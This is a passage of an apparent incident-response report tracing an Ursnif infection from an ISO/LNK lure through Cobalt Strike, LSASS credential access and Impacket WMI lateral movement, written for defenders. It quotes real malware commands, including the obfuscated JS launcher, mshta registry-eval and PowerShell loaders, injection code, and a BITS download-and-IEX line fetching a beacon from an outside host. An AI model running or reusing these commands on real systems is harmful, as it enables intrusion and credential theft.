Unwrapping Ursnifs Gifts - Execution Flow\n  \n  Execution Chain\n  1. Explorer.exe\n     - ISO mounted by user\n     - `.LNK` file clicked by user\n     - Batch script `alsoOne.bat` executed\n     - `Wscript.exe` executes `canWell.js`\n     - `123.com` (using `rundll32`) executes `Gozi.dll`\n     - `internetcocal[.]in` (superstarts[.]top)\n  \n  2. Mshta.exe Execution\n     - `mshta.exe` used to launch `ActiveXObject()`\n     - Spawns `powershell.exe`\n     - Powershell Execution in Registry**:\n       - `HKCU\\Software\\AppDataLow\\Software\\Microsoft\\<GUID>\\ <KEYWORD1>`\n       - `HKCU\\Software\\AppDataLow\\Software\\Microsoft\\<GUID>\\ <KEYWORD2>`\n  \n  3. Process Access & Create Remote Thread\n     - `csc.exe` (C# Compiler) - Dynamic Compilation\n  \n  4. 32-bit `cmd.exe` Execution\n  \n  ---\n  \n  Persistence\n  - File Creation:\n    - `C:\\Users\\<USERNAME>\\<KEYWORD1>.lnk` (Points to `powershell.exe`)\n    - `C:\\Users\\<USERNAME>\\<KEYWORD2>.ps1`\n  - Registry Key for Execution:\n    - User `Run` key created to execute `<KEYWORD1>.lnk` with `<KEYWORD2>.ps1`\n  \n  ---\n  \n  Discovery Commands\n  Executed via `cmd.exe`:\n  - `wmic computersystem get domain`\n  - `systeminfo.exe`\n  - `cmd /C net view`\n  - `cmd /C nslookup 127.0.0.1`\n  - `tasklist.exe /SVC`\n  - `driverquery.exe`\n  - `cmd /C reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s`\n  - `cmd /C net config workstation`\n  - `cmd /C nltest /domain_trusts`\n  - `cmd /C nltest /domain_trusts /all_trusts`\n  - `cmd /C net view /all /domain`\n  - `cmd /C net use`\n  \n  Staging of Output:\n  - Standard output of discovery commands is redirected to a staging file:\n    - `C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\BD2C.bin`\n```\n\n### Ursnif Malware\n\nHighlighted in **Initial Access**, the LNK file would execute a batch script `alsoOne.bat`. This script called a JavaScript file `canWell.js` in the same directory and provided a number of strings as arguments.\n\n```\nalsoOne.bat\n```\n\n```\nset %params%=hello\nme\\canWell.js hello cexe lldnur revreSretsigeRllD\n```\n\n```\ncanWell.js\n```\n\n```\n/**\n\tWhnldGh\n*/\nfunction reverseString(str)\n{\n\tvar splitString = str.split(\"\");\n\tvar reverseArray = splitString.reverse();\n\tvar joinArray = reverseArray.join(\"\");\n\treturn joinArray;\n}\nfunction ar(id)\n{\n\tr = WScript.Arguments(id);\n\treturn r;\n}\nvar sh = WScript.CreateObject(\"WScript.Shell\");\nsh[reverseString(ar(1))](\"me\\\\123.com me/itsIt.db,\"+reverseString(a\n```\n\nThe JS file was then executed with `wscript.exe` and used the provided command line arguments, which created and executed the following command using `WScript.Shell.Exec()`:\n\n```image\nAlt: WScript Execution\nDescription: The image illustrates the execution flow related to Gozi malware, showing the relationship between components involved in the malware's operation. It highlights the renamed copy of 'rundll32.exe' supplied in an ISO as '123.com', which is used to register the Gozi malware DLL. The diagram includes arrows pointing to key elements: the Gozi malware DLL, the entry function 'DllRegisterServer', and the source of the renamed executable. The background is dark, and the text is color-coded for clarity.\nTranscription: |\n  Gozi malware DLL\n          ↑\n  me/123.com me/itsIt.db,DllRegisterServer\n          ↓\n  Copy of rundll32.exe supplied in ISO renamed to 123.com\n          ↑\n  Entry Function to register DLL\n```\n\n```\nme/123.com me/itsIt.db,DllRegisterServer\n```\n\nUsing the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data.\n\n```image\nAlt: SRUM Data\nDescription: The image is a screenshot of a data table from a cybersecurity analysis tool. It contains columns labeled 'Timestamp', 'Exe Info', 'Sid Type', 'Sid', 'User Name', 'Bytes Received', 'Bytes Sent', 'Interface Luid', and 'Interface Type'. The table details a specific execution related to the Ursnif malware, with a highlighted entry showing the execution information for a command related to a URL and associated network activity, including bytes received and sent.\nTranscription: |\n  | Timestamp | Exe Info                  | Sid Type         | Sid         | User Name | Bytes Received | Bytes Sent | Interface Luid   | Interface Type           |\n  | --------- | ------------------------- | ---------------- | ----------- | --------- | -------------- | ---------- | ---------------- | ------------------------ |\n  |           | \\device\\cdrom0\\me\\123.com | UnknownOrUserSid | S-1-5-21... |           | 435520         | 21349      | 1689399632855040 | IF_TYPE_ETHERNET_CS MACD |\n```\n\nOnce the malware was executed, the parent instance of explorer launched MSHTA with the following command:\n\n```\n\"C:\\Windows\\System32\\mshta.exe\" \"about:<hta:application><script>Cxak='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Cxak).regread('HKCU\\\\\\Software\\\\AppDataLow\\\\Software\\\\Microsoft\\\\472A62F9-FA62-1196-3C6B-CED530CFE2D9\\\\\\ActiveDevice'));if(!window.flag)close()</script>\"\n```\n\nThis oneliner created a new ActiveX object to eval() the content stored in the registry key in the users registry hive. The content of the value “ActiveDevice”:\n\n```image\nAlt: Registry Key\nDescription: The image shows a detailed view of registry values related to the Ursnif malware's execution. It includes various registry entries like 'NameActive', 'MemoryJunk', and 'ActiveDevice', along with their types and corresponding binary data. The highlighted 'ActiveDevice' entry contains a PowerShell command that creates aliases for PowerShell commands, demonstrating the malware's behavior in manipulating system settings. This data is crucial for understanding the malware's operation and its effects on the system.\nTranscription: |\n  | Value Name      | Value Type | Data                                                                                                      |\n  | --------------- | ---------- | --------------------------------------------------------------------------------------------------------- |\n  | NameActive      | RegSZ      | D5-5A-99-3D-B6-A5-6F-FF-D6-5A-3D-B1-A5-70-FF-8F-5B-3D-3D-...                                              |\n  | DocumentCheck   | RegSZ      | D5-5A-99-3D-B6-A5-6F-FF-D6-5A-70-FF-8F-5B-3D-3D-...                                                       |\n  | MemoryJunk      | RegBinary  | 24-78-71-68-6F-67-22-6D-6E-68-66-76-6F-72-6D-6F-6E-6F-6E-...                                              |\n  | ActiveDevice    | RegSZ      | Ahgvof=new ActiveXObject('WScript.Shell');Ahgvof.Run('powershell new-alias -name qirlbtfhgo -value gp;... |\n  | ManagerText     | RegSZ      | mshta \"about:<hta:application><script>Cxak='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Cxak)...  |\n  | BlackActive     | RegBinary  | {929B70B6-C9D1-9480-E3E6-00B0C779A1BC}                                                                    |\n  | UltTime         | RegQWord   | 3952832347                                                                                                |\n  | DriverCollision | RegSZ      | 35-F9-ED-6F-89-3D-20-7A-C7-A7-49-CC-6E-94-FB-E9-...                                                       |\n```\n\nThe payload used another ActiveX object to run a PowerShell command. This command created additional aliases of common default PowerShell aliases `gp` (Get-ItemProperty) and `iex` (Invoke-Expression). These two new aliases were used to get and execute the content in another registry value “MemoryJunk”:\n\n```\nAhgvof=new ActiveXObject('WScript.Shell');Ahgvof.Run('powershell new-alias -name qirlbtfhgo -value gp; new-alias -name kvikpt -value iex; kvikpt ([System.Text.Encoding]::ASCII.GetString((qirlbtfhgo \"HKCU:\\Software\\\\AppDataLow\\\\Software\\\\Microsoft\\\\472A62F9-FA62-1196-3C6B-CED530CFE2D9\").MemoryJunk))',0,0);\n```\n\n*Analyst Note: The names of the registry values changed when we ran the payload in a sandbox during analysis, and hence suspected to be generated at random at execution.*\n\nThe last registry key was used to store additional PowerShell code. This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode stored in Base64.\n\n```image\nAlt: PowerShell Code\nDescription: The image displays a data table likely from a registry viewer, showing various registry values associated with a malware analysis. Each row includes a 'Value Name', 'Value Type', and 'Data', with entries such as 'MemoryJunk', 'ActiveDevice', and others. The data in these registry entries appears to include binary values, script commands, and other encoded information related to the Ursnif malware execution. Additionally, there is a hex view of the data at the bottom, showing its binary representation.\nTranscription: |\n  | Value Name                             | Value Type | Data                                                                         |\n  | -------------------------------------- | ---------- | ---------------------------------------------------------------------------- |\n  | NameActive                             | RegBinary  | D5-5A-99-3D-B6-A5-6F-FF-D6-5A-99-3D-B1-A5-70-FF-5F-5B-98-3D-...              |\n  | DocumentCheck                          | RegBinary  | D5-5A-99-3D-B6-A5-6F-FF-D6-5A-99-3D-B1-A5-70-FF-5F-5B-98-3D-...              |\n  | MemoryJunk                             | RegBinary  | 24-78-71-68-61-6F-77-79-32-26-68-22-36-22-36-...                             |\n  | ActiveDevice                           | RegSz      | Ahgvof=new ActiveXObject(\"WScript.Shell\");Ahgvof.Run('powershell...          |\n  | ManagerText                            | RegSz      | mshta \"about:<hta:application><script>Cxak='wscript.shell';resizeTo(0,2);... |\n  | BlackActive                            | RegBinary  | B8-08-00-00-3C-31-80-00-9A-56-A3-DB-1DB-02-17-3C-6B-CE-D5-...                |\n  | {92978D76-C9D1-940B-E36-0D0BC777A19C}  | RegBinary  | 70-95-95-3E-5F-3B-8D-01                                                      |\n  | {E89E9406-4EA7-586B-B04F-6259E4F386D9} | RegBinary  | 4C-4C-76-5A-87-BD-8-01                                                       |\n  | UtiTime                                | RegQword   | 2953982374                                                                   |\n  | DriverCollision                        | RegBinary  | 35-F9-6E-6F-89-CE-00-27-CA-A7-4F-39-CC-54-AF-B8-FE-B9-...                    |\n  \n  Type viewer:\n  00000000  00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |................|\n  00000010  10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F  |................|\n  00000020  20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30  | !\"#$%&'()*+,-./0|\n  00000030  31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40 41  |123456789:;<=>?@A|\n  00000040  42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52  |BCDEFGHIJKLMNOPQR|\n  00000050  53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60 61 62 63  |STUVWXYZ[\\]^_`abc|\n  00000060  64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74  |defghijklmnopqrstu|\n  00000070  75 76 77 78 79 7A 7B 7C 7D 7E 7F 80 81 82 83 84 85  |uvwxyz{|}~........|\n```\n\n```image\nAlt: PowerShell Code\nDescription: The image displays a code output from a programming environment or debugger. It contains a C# code snippet that imports functions from the 'kernel32.dll' library, specifically for process management. The functions listed include 'QueueUserAPC', 'GetCurrentThread', 'OpenThread', and 'GetCurrentProcess'. The code is formatted in a way that suggests it is part of a larger script or application, with details on function definitions and parameters.\nTranscription: $horjee=[DllImport(\"kernel32\")]public static extern uint QueueUserAPC(IntPtr hstksfrkue,IntPtr nxcjsjshatc,IntPtr oryck);n[DllImport(\"kernel32\")]public static extern IntPtr GetCurrentThread();n[DllImport(\"kernel32\")]public static extern IntPtr OpenThread(uint icv,uint tulhsch,IntPtr rubl);$ulaylmq=Add-Type -MemberDefinition $horjee -Name 'eyoliuidump' -namespace W32 -passthru;$crgy=\"n[DllImport(\"kernel32\")]public static extern IntPtr GetCurrentProcess\";n[DllImport(\"kernel32\")]public static extern void\n```\n\nWhen Add-Type cmdlet is executed, the C# compiler csc.exe is invoked by PowerShell to compile this class definition, which results in the creation of temporary files in %APPDATA%\\Local\\Temp.\n\n```\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @\"C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\npfdesjp\\npfdesjp.cmdline\"\n```\n\nFinally, a unique command spawned from the parent explorer.exe process that was called pause.exe with multiple arguments, which appeared to not provide any additional functionality.\n\n```\n\"C:\\Windows\\syswow64\\cmd.exe\" /C pause dll mail, ,\n```\n\n*A sigma rule for this cmdline can be found in the **Detections** section of this report.*\n\nAt this point in time, less than a minute of time has elapsed since the user first opened the malware.\n\nOnce the malware was established on the host, there was limited malicious activity, until around 3 days later. That is when we began to observe evidence indicative of “hands-on-keyboard” activity.\n\n### Cobalt Strike\n\nAn instance of cmd.exe was launched through explorer.exe which ran the following command:\n\n```\npowershell.exe  -nop -c \"start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'hxxp://193.201.9.199:80/a’ -Destination $d; $t = [IO.File]::ReadAllText($d); Remove-Item $d; IEX $t } -Argument 0 | wait-job | Receive-Job\"\n```\n\n*Analyst Note: Ursnif has been known to have VNC-like capabilities. It is possible this explorer.exe ➝ cmd.exe session was through a VNC session.*\n\nThis PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%. It then read the file into a variable, and deleted it before executing content with `IEX`.\n\nThe event log `Microsoft-Windows-Bits-Client%254Operational.evtx` corroborated this activity:\n\n```image\nAlt: BITS Job\nDescription: The image displays a screenshot of an event log from the Microsoft BITS (Background Intelligent Transfer Service) client. It shows several log entries with various event IDs, including an event marked with ID 59, which indicates that a BITS transfer job was started associated with a specific URL (http://193.201.9.199:80/a). The log contains details categorized as 'Verbose', 'Information', and 'Warning', illustrating different levels of logging for BITS activities.\nTranscription: |\n  Event 59, Bits-Client\n  \n  General\n  BITS started the BITS Transfer transfer job that is associated with the http://193.201.9.199:80/a URL.\n  \n  Details\n  Verbose      Bits-Client  306  None\n  Information  Bits-Client  60   None\n  Information  Bits-Client  59   None\n  Warning      Bits-Client  310  None\n  Information  Bits-Client  16403 None\n  Information  Bits-Client  3    None\n  Information  Bits-Client  206  None\n```\n\nThe activity following this event demonstrated a clear distinction of the threat actor performing discovery manually.\n\n## Persistence\n\nOnce the foothold had been achieved, after execution of Ursnif on the beachhead host, persistence was achieved by creating a ‘Run’ key named ManagerText which was configured to execute a LNK file which executed a PowerShell script.\n\n```image\nAlt: Persistence\nDescription: The image displays a log output related to a malware persistence mechanism, specifically for the Ursnif malware. It includes various fields: 'UtcTime', 'ProcessGuid', 'ProcessId', and 'Image', showing details about the process initiated by 'C:\\Windows\\Explorer.EXE'. The 'TargetObject' indicates a registry path where a 'Run' key named 'ManagerText' is created. The 'Details' field shows a command that executes a LNK file to run a PowerShell script. This information is critical for understanding how Ursnif maintains persistence on a compromised system.\nTranscription: |\n  UtcTime: {2a3bd16a-1875-62a9-e508-000000000200}\n  ProcessGuid: {2a3bd16a-1875-62a9-e508-000000000200}\n  ProcessId: 9600\n  Image: C:\\Windows\\Explorer.EXE\n  TargetObject: HKU\\S-1-5-21-...\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ManagerText\n  Details: cmd /c start C:\\Users\\...\\ManagerText.lnk -ep unrestricted -file C:\\Users\\...\\ActiveDevice.ps1\n  User:\n```\n\n## Credential Access\n\nWe observed a process created by Cobalt Strike accessing lsass.exe. The GrantedAccess code of `0x1010` is a known indicator of such tools as Mimikatz. This was observed on both the beachhead host and a domain controller.\n\n```\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=10\nEventType=4\nComputerName=<REDACTED>\nUser=SYSTEM\nSid=S-1-5-18\nSidType=1\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=765707\nKeywords=None\nTaskCategory=Process accessed (rule: ProcessAccess)\nOpCode=Info\nMessage=Process accessed:\nRuleName: technique_id=T1003,technique_name=Credential Dumping\nUtcTime: <REDACTED>\nSourceProcessGUID: {aaadb608-97b2-630c-6750-000000000400}\nSourceProcessId: 4768\nSourceThreadId: 4248\nSourceImage: C:\\Windows\\system32\\rundll32.exe\nTargetProcessGUID: {aaadb608-45a2-62fc-0c00-000000000400}\nTargetProcessId: 672\nTargetImage: C:\\Windows\\system32\\lsass.exe\nGrantedAccess: 0x1010\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\Windows\\System32\\KERNELBASE.dll+20d0e|UNKNOWN(000002AA74CFD95C)\n```\n\n## Discovery\n\n### Ursnif related discovery\n\nAs we have observed in other malware, Ursnif ran a number of automated discovery commands to gain information about the environment. The following commands were executed and their standard output was redirected to append to a file in the user’s %APPDATA%\\Local\\Temp\\\n\n```\ncmd /C \"wmic computersystem get domain |more > C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"systeminfo.exe > C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"net view >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"nslookup 127.0.0.1 >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"tasklist.exe /SVC >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"driverquery.exe >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"nltest /domain_trusts >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"net config workstation >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"nltest /domain_trusts >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"nltest /domain_trusts /all_trusts >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"net view /all /domain >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"net view /all >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n```\n\n### Manual discovery\n\nOnce the threat actor had Cobalt Strike running on the beachhead host, they ran the following commands:\n\n```\nwhoami\nwhoami  /groups\ntime\nipconfig /all\nsysteminfo\n```\n\nThe threat actor quickly took interest in a support account. This account belonged to the Domain Admin group.\n\n```\nnet user <REDACTED>\n```\n\nThe threat actor also used a batch script to collect a list of all computer objects on the domain using `C:\\Windows\\system32\\cmd.exe /C adcomp.bat` which contained the PowerShell command:\n\n```\npowershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt\n```\n\nDuring the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the `/4` command line argument.\n\n```\nC:\\Windows\\system32\\taskmgr.exe /4\n```\n\n## Lateral Movement\n\nWMI was used to pivot to a domain controller on the network. The actor leveraged Impacket’s wmiexec.py to execute commands with a semi-interactive shell, most likely using credentials gathered by the previous LSASS access.\n\nThe commands executed included directory traversal, host discovery, and execution of tools on the DC.\n\n```image\nAlt: WMI Commands\nDescription: The image displays a series of command line entries executed via the Windows Command Prompt (cmd.exe). Each command follows a structure that includes the command to be executed (e.g., 'firefox.exe', 'systeminfo', 'setup.msi'), along with parameters indicating silent execution (/Q), command execution context (/c), and output redirection to a specific path ('\\127.0.0.1\\ADMIN$'). The commands indicate lateral movement techniques that may have been used by threat actors during an intrusion, showcasing the commands used to interact with the system and gather information.\nTranscription: |\n  cmd.exe /Q /c firefox.exe 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c systeminfo 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c setup.msi 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c cd c:\\programdata 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__16617 38534 2>&1\n```\n\nA breakdown of the parent and child processes invoked:\n\n```image\nAlt: Process Breakdown\nDescription: The image displays a table detailing the hierarchy of processes involved in a cyber intrusion, specifically focusing on the execution of 'firefox.exe' and other related processes. It lists the 'Image' (executed process), 'ParentImage' (the parent process from which it was spawned), and 'ParentCommandLine' (the command line used to initiate the parent process). This information is crucial for understanding the execution flow and the relationships between the processes during the attack.\nTranscription: |\n  | Image                              | ParentImage                 | ParentCommandLine                                           |\n  | ---------------------------------- | --------------------------- | ----------------------------------------------------------- |\n  | C:\\ProgramData\\firefox.exe         | C:\\Windows\\System32\\cmd.exe | cmd.exe /Q /c firefox.exe 1> \\\\127.0.0.1\\ADMIN$\\__1661 2>&1 |\n  | C:\\Windows\\System32\\systeminfo.exe | C:\\Windows\\System32\\cmd.exe | cmd.exe /Q /c systeminfo 1> \\\\127.0.0.1\\ADMIN$\\__1661 2>&1  |\n  | C:\\Windows\\System32\\msiexec.exe    | C:\\Windows\\System32\\cmd.exe | cmd.exe /Q /c setup.msi 1> \\\\127.0.0.1\\ADMIN$\\__1661 2>&1   |\n```\n\nThe command can be broken down as follows:\n\n- ‘Q’ indicates turn off echo – no response.\n- ‘C’ indicates to stop after command execution.\n- The 127.0.01 and ADMIN$ indicates C:\\Windows.\n- Output is achieved via the parameter ‘2>&1’, to redirect errors and output to one file:\n\n```image\nAlt: Command Breakdown\nDescription: The image displays a snippet of code that is indicative of a command being constructed for execution via Windows Management Instrumentation (WMI). The command involves redirecting output and error messages to a specified output file, utilizing the IP address 127.0.0.1, which refers to the local machine. The syntax includes elements for command redirection and network share access, suggesting its use in a context related to remote command execution or lateral movement in a network environment.\nTranscription: command += ' ' + '1> ' + '\\\\\\\\127.0.0.1\\\\%s' % self.__share + self.__output + ' 2>&1'\n```\n\nThis command line closely resembles the code within the wmiexec.py as part of the Impacket tool maintained by Fortra.\n\nAs Impacket interacts with remote endpoints via WMI over TCP via DCERPC, it’s possible to inspect network level packets:\n\n```image\nAlt: Network Packets\nDescription: The image appears to show a command line snippet that includes parameters for executing a command, likely related to remote execution via WMI (Windows Management Instrumentation). The command includes elements such as ‘Q’ to turn off echo, ‘C’ to stop after execution, and an indication of a local address (127.0.0.1). The formatting suggests that it captures the structure of a command execution using Impacket's functionality, which is relevant to the previously described cyber threat context.\nTranscription: PARAMETERS: cmd.exe /Q /c setup.msi 1> \\\\127.0.0.1\\1\n```\n\nThe use of Impacket by threat actors has been recently detailed by CISA in alert AA22-277A – Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.\n\n```image\nAlt: Impacket Process Hierarchy\nDescription: The image displays a cybersecurity advisory document co-authored by CISA, FBI, and NSA. It is titled 'Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.' The advisory emphasizes the use of the Impacket tool in cyber threats and provides insights into the implications for national security. The document features logos of the respective agencies and includes a TLP (Traffic Light Protocol) designation of 'WHITE,' indicating that the information can be shared freely.\nTranscription: |\n  JOINT CYBERSECURITY ADVISORY\n  Co-Authored by:\n  \n  - CISA\n  - FBI\n  - NSA\n  \n  Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization\n  \n  TLP:WHITE\n  Product ID:\n  October\n```\n\nThe Impacket process hierarchy in this case can be visualized as:\n\n```image\nAlt: Impacket Process Hierarchy\nDescription: The image is a flow diagram illustrating the process hierarchy related to the use of Windows Management Instrumentation (WMI) by a threat actor. It shows the interactions between different components, including a proxy process, Powershell, WMIPrvSE, Cmd, and the Systeminfo command. The diagram indicates the flow of commands and how they are executed, providing a visual representation of the technical processes involved in lateral movement and command execution during an intrusion.\nTranscription: |\n  Proxy Process\n      └── Powershell\n          └── DCERPC\n              └── WMIPrvSE\n                  └── wmiprvse.exe -secured -Embedding\n                      └── Cmd\n                          └── cmd.exe /Q /c systeminfo > \\\\127.0.0.1\\ADMIN$\\xxxxxxxx 2>&1\n                              └── Systeminfo\n                                  └── systeminfo\n```\n\nAt the network level, commands are issued by DCOM/RPC port 135, with responses by SMB using port 445. We can observe a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.\n\n```image\nAlt: WMI Requests\nDescription: The image is a screenshot of a network traffic analysis tool displaying a log of DCERPC (Distributed Component Object Model Remote Procedure Call) packets. The log includes details such as source port, destination port, protocol, length of packets, and a description of the information exchanged during the communication. The entries indicate various call types and responses involved in the DCERPC protocol, which is relevant for understanding the network activity associated with WMI commands and lateral movement in a cybersecurity context.\nTranscription: |\n  | Src port | Dst port | Protocol    | Length | Info                              |\n  | -------- | -------- | ----------- | ------ | --------------------------------- |\n  | 49671    | 59741    | DCERPC      | 388    | Bind_ack: call_id: 1, Fragment: 1 |\n  | 49671    | 59741    | DCERPC      | 468    | AUTH3: call_id: 1, Fragment: 1    |\n  | 49671    | 59741    | DCERPC      | 210    | Request: call_id: 2, Fragment: 1  |\n  | 49671    | 59741    | DCERPC      | 278    | Response: call_id: 2, Fragment: 1 |\n  | 49671    | 59741    | DCERPC      | 384    | Alter_context_resp: call_id: 1    |\n  | 49671    | 59741    | IRemUnknown | 182    | RemRelease request: Cnt=1         |\n  | 49671    | 59741    | IRemUnknown | 166    | RemRelease response -> S: 1       |\n  | 49671    | 59741    | DCERPC      | 384    | Alter_context: call_id: 1         |\n  | 49671    | 59741    | DCERPC      | 468    | AUTH3: call_id: 3, Fragment: 1    |\n  | 49671    | 59741    | DCERPC      | 226    | Request: call_id: 6, Fragment: 1  |\n```\n\nCorrelating the network activity to the host activity confirms that the ‘Powershell.exe’ process initiated the WMI requests.\n\n```image\nAlt: WMI Requests\nDescription: The image displays a section of log data related to a PowerShell process execution. It includes details such as the image path (C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe), user, protocol (tcp), and connection initiation status. Additionally, it provides source and destination IP addresses, source and destination ports, and other technical parameters relevant to network activity monitoring. This information is critical for understanding the context of lateral movement within a network security incident.\nTranscription: |\n  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  User:\n  Protocol: tcp\n  Initiated: true\n  SourceIsIpv6: false\n  SourceIp:\n  SourceHostname: -\n  SourcePort: 59741\n  SourcePortName: -\n  DestinationIsIpv6: false\n  DestinationIp:\n  DestinationHostname: -\n  DestinationPort: 49671\n  DestinationPortName: -\n```\n\nThe destination port is within the ephemeral port range 49152–65535, which is for short-lived, time-based, communications RFC 6335.\n\n13Cubed (Richard Davis) also released an amazing resource to investigate Impacket related incidents here:\nhttps://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf\n\nOne of the observed commands invoked via WMI was ‘firefox.exe’.\n\nThis was dropped on the DC and spawned a number of processes and invoked a number of hands-on commands.\n\n```image\nAlt: Firefox Process\nDescription: The image illustrates a process hierarchy involved in a cyber attack, specifically highlighting the interactions between various processes such as 'firefox.exe', 'cmd.exe', 'Powershell', and 'RunDLL32.exe'. It depicts a flow of control, showing how 'firefox.exe' is used for discovery and process injection, leading to credential dumping via 'RunDLL32.exe'. The image also indicates the command execution involving Active Directory discovery and the use of specific commands to interact with network resources.\nTranscription: |\n  c:\\programdata\n  C2: 193.201.9[.]199:443\n  \n                     +------------------+\n                     |   firefox.exe    |\n                     +------------------+\n                            |\n                            |  Discovery\n                            |\n                     +------------------+\n                     |      cmd.exe     |\n                     +------------------+\n                            |\n                            |  net group \"domain admins\" /domain\n                            |  time\n                            |  adcomp.bat\n                            |\n                     +------------------+\n                     |    Powershell    |\n                     +------------------+\n                            |\n                            |  Get-ADComputer -Filter * -Properties Name,...\n                            |\n                     +------------------+\n                     |   RunDLL32.exe   |\n                     +------------------+\n                            |\n                            |  Credential Dumping\n                            |\n                     +------------------+\n                     |      LSASS       |\n                     +------------------+\n                            |\n                     TargetUser: NT AUTHORITY\\SYSTEM\n```\n\nThe process generated a significant volume of network connections to 193.201.9[.]199, averaging ~6K requests per hour, equating to >150K connections throughout the duration of the intrusion.\n\n```image\nAlt: Network Connections\nDescription: The image depicts a time series graph illustrating network connections over a 24-hour period. The y-axis represents the number of connections, with values ranging from 0 to 6,000, while the x-axis spans time from midnight to midnight of the following day. The graph shows a significant spike in connections, likely indicating a period of high activity, with a notable drop-off afterward. The area under the curve is shaded in purple, emphasizing the volume of connections generated during the observed time frame.\nTranscription: |\n  Graph Data:\n  - Y-axis: Number of Requests\n  - X-axis: Time (HH:MM)\n  - Maximum Requests: 6,000\n  - Minimum Requests: 0\n  - Data Points:\n    - 00:00 - 2,000\n    - 08:00 - 6,000\n    - 16:00 - 4,000\n    - 00:00 - 2,000\n    - 08:00 - 6,000\n```\n\nRDP was also used by the threat actor on the final two days of the intrusion to 